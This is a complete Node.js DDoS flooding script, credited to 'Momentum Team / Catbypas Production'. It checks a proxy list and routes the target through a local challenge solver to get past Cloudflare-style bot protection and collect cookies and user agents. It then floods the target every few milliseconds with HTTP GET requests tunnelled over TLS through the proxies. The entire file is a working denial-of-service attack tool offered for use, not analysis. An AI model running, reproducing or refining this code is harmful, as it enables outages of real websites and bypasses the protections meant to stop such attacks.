const request = require('request'),
fs = require('fs'),
{
    constants

} = require('crypto'),
http = require('http'),
tls = require('tls'),
rqJar = request.jar(),
url = require('url'),
referer = require('rand-referer'),
proxyChecker = require('proxy-checker'),
ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError'],
ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO'];

process.on('uncaughtException', function (e) {
if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    console.warn(e);
}).on('unhandledRejection', function (e) {
if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    console.warn(e);
}).on('warning', e => {
if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    console.warn(e);
}).setMaxListeners(0);


const target = process.argv[2],
time = process.argv[3],
browser_counts = process.argv[4],
httpversion = process.argv[5],
conn_timeout = process.argv[6],
rps = process.argv[7],
proxylists = process.argv[8];

const proxylist = fs.readFileSync(proxylists,"utf-8").toString().match(/\S+/g);

var log = console.log;

global.logger = function() { 

    var first_parameter = arguments[0];
    var other_parameters = Array.prototype.slice.call(arguments, 1);

    function formatConsoleDate(date) {

        var hour = date.getHours();
        var minutes = date.getMinutes();
        var seconds = date.getSeconds();
        return '\x1b[0m(' + ((hour < 10) ? '0' + hour : hour) +':' +((minutes < 10) ? '0' + minutes : minutes) +':' +((seconds < 10) ? '0' + seconds : seconds) +') ';

    }

    log.apply(console, [formatConsoleDate(new Date()) + first_parameter].concat(other_parameters));

};

logger(`FIREFOX-OTTER Browser started on [${target}].`)
logger(`Momentum Team / Catbypas Production :)`)
logger(`Starting proxy checker`)

start()

function start() {
    checkp()
    setInterval(() =>{
        checkp()
    }, 15000)
}

function createfiles() {
    fs.writeFileSync('hproxy.txt'," ")
}

function checkp() {

    createfiles()

    proxyChecker.checkProxiesFromFile(
        proxylists,
        {
            url: 'http://www.example.com',
        },
        function(host, port, ok, statusCode, err) {
            
            if(statusCode !== 200){
                return;
            }else if(statusCode == 200){
                var ppp = `${host}:${port}`
                fs.appendFileSync('hproxy.txt', `${ppp}\n`, async err => {
                    if(err){
                        logger(err.message)
                        process.exit(-1)
                    }else{
                        return
                    }
                })
            }
        }
    );

    setTimeout(() => {

        const hlist = fs.readFileSync('hproxy.txt',"utf-8").toString().match(/\S+/g); 
        
        function randomhproxy() {
            return hlist[Math.floor(Math.random() * hlist.length)]
        }

        for(var z =0;z<browser_counts;z++){
            // logger(randomhproxy())
            start_browser(randomhproxy())
        }
    }, 10000)
    
}

function start_browser(api_proxy) {
    
    logger(`[${api_proxy}] Starting Browsing`)

    request({
        method: "POST",
        url: "http://localhost:8191/v1",
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify({
            cmd: "request.get",
            url: target,
            proxy: {
                "url": `http://${api_proxy}/`,
            },
            maxTimeout: conn_timeout,
        }),

    }, function (err, res, body){
        if(err){
            return console.log(err)

        }else{
            var solver = JSON.parse(res.body);
            if(solver.status == 'ok'){
                logger(`[${api_proxy}] Status: ${solver.status}.`)
                var useragent = solver.solution.userAgent
                if(solver.solution.cookies === undefined || !solver.solution.cookies){
                    console.log(`[${api_proxy}] have no cookie, maybe next request.`)
                }

                if(solver.solution.cookies !== undefined) {
                    const obj = solver.solution.cookies
                    var cookie;
                    var p = JSON.stringify(obj);
                    p = JSON.parse(p);
                    p.forEach((p) => {
                        if(p == undefined) return;
                        cookie += p.name + '=' + p.value + ';';
                        cookie = cookie.replace("undefined","")
                    });
                    
                    logger(`[${api_proxy}] Solved Challenge.`)
                    logger(`[${api_proxy}] Get Cookie: ${cookie}.`)
                    logger(`[${api_proxy}] Get Uas: ${useragent}`)
                    flooder(api_proxy,useragent,cookie)
                }

            }else {
                logger(`[${api_proxy}] Status: \x1b[31mdead\x1b[0m`)
            }
        }
    })    
}

function flooder(proxy, ua, cookie) {
    logger(`[${proxy}] Started Flood.`)
    if(cookie == undefined || !cookie){
        return logger(`[${proxy}] Exit Flood. Reason: No Cookie`)
    }

    var br_proxie = proxy.split(':');
    var host = url.parse(target).host;
    var path = url.parse(target).path;

    setInterval( function() {


        var req = http.request({
            host: br_proxie[0],
            port: br_proxie[1],
            headers: {
                'User-Agent': ua,
                'Cookie': cookie
            },
            jar: rqJar,
            rejectUnauthorized: false,
            method: 'CONNECT',
            path: host +':443'
        },function() {
            req.setSocketKeepAlive(true);
        });

        req.on('connect', function (res, socket, head) {
            var TlsConnection = tls.connect({
                host: host,
                ciphers: 'kEECDH+ECDSA:kEECDH:kEDH:HIGH:MEDIUM:+3DES:+SHA:!RC4:!aNULL:!eNULL:!LOW:!MD5:!EXP',
                secureProtocol: ['TLSv1_1_method', 'TLSv1_2_method_', 'TLSv1_3_method'], 
                servername: host,
                secure: true,
                requestCert: true,
                rejectUnauthorized: false,
                sessionTimeout: 10000,
                port: 443,
                socket: socket            
            }, function () {
                for (let j = 0; j < rps; j++) {
                    TlsConnection.setKeepAlive(true, 10000)
                    TlsConnection.setTimeout(10000);
                    TlsConnection.write(`GET ${path} ${httpversion}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nuser-agent: ${ua}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n`);
                }
            });

            TlsConnection.on('data', (chunk) => {
                setTimeout(function() {
                    TlsConnection.destroy();
                    return delete TlsConnection;
                }, 10000);
            });

        }).end();

    },5)


}